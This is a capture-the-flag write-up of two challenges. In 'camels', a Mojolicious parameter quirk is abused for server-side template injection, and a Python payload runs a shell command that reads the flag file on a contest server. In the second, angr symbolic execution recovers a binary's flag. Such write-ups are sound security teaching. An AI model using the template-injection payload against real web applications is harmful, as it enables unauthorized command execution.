# Challenge: camels

The `variant` parameter is extracted from the URL using `param($c->req->url->query, "variant")`:

```perl
sub param {
    my $__ = (split(/::/,(caller(0))[3]))[-1];
    my $___ = $_[0]->$__($__) || $__;
    my @____ = $_[0]->$___($_[1]);
    return ref($____[0]) ? @{$____[0]} : $____[0];
}
```

`$q` is `Mojo::Parameters` which contains method [clone](https://docs.mojolicious.org/Mojo/Parameters.txt) that allow us to populate the hash containing the arguments to `$c->render(...)`, i.e. we can add argument `inline => 'SSTI: <%= 1 + 1 %>.'` and do a server-side template injection attack (SSTI).

To avoid bash/curl formatting issues, I used the python library `httpx` (like requests) to create this payload:

```python
import httpx
httpx.get("http://167.235.153.119:8403/", params={
    "param": "clone",
	"inline": "<%= `cat /camels/flag.txt` %>"
}).text
# 'BHCTF{you_and_the_camels_are_one}\n'
```

# Challenge: Understanding is forthcoming (part 1)

Really cool binary! Luckily Angr somehow knows what is going on:

```
import angr

proj = angr.Project("./forthcoming", auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

simgr.explore(find=lambda s: "you got it" in s.posix.dumps(1))
# 1 path found! <SimulationManager with 2 active, 34 deadended, 1 found>

print(simgr.found[0].posix.dumps(0))  # dumps(0) is stdin
# b'BHCTF{d1d_y0u_3nj0Y_mY_l1ttl3_Rn9}\n'
```
